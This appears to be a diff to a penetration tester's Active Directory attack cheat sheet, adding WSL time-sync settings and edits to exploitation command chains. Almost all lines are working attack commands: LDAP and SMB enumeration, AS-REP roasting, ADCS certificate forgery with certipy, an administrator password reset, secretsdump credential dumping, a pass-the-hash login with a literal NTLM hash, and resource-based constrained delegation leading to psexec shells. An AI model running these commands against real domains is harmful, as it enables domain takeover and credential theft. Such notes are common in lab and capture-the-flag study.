@@ -30,13 +30,16 @@ dhcp=true
 ipv6=false
 
 sudo nano /etc/wsl.conf
+[wsl2]
+timeSync = false
+
 [network]
 generateResolvConf = false
 generateHosts = false
 
 [boot]
 systemd = true
-command = sudo chattr -i /etc/resolv.conf; while read -r ns; do echo $ns | sudo tee -a /etc/resolv.conf; sort -u /etc/resolv.conf | sudo tee /etc/resolv.conf; done < /nameservers
+command = sudo chattr -i /etc/resolv.conf; cat /nameservers > /etc/resolv.conf
 
 [*] DNS
 sudo nano /etc/resolv.conf
@@ -121,12 +124,12 @@ gobuster vhost --append-domain -u $DOM -k -r -t 30 --exclude-length 0 \
 
 # Exploitation
 ## Initial Enumeration
+sudo ntpdate -u $TARGET
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'; echo ''
 read "?Please add 'dnsHostName' to DC and Domain in MegaSheet then press any key to continue..."
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
 impacket-getTGT -dc-ip $TARGET $DOM/Guest -no-pass; export KRB5CCNAME=`pwd`/Guest.ccache
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
-sudo ntpdate -u $TARGET
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
@@ -429,7 +432,8 @@ certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=
 certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
 certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
-evil-winrm -i $TARGET -u administrator -p '123qweasdF!'
+sudo ntpdate -u $TARGET; impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
+evil-winrm -i $TARGET -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
 
 +---------- Crack ----------+
 pfx2john user.pfx
@@ -648,7 +652,7 @@ impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-nam
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
 impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
 impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "host/$DC"
-export KRB5CCNAME=`pwd`/administrator@host_
+export KRB5CCNAME=`pwd`/administrator
 impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 
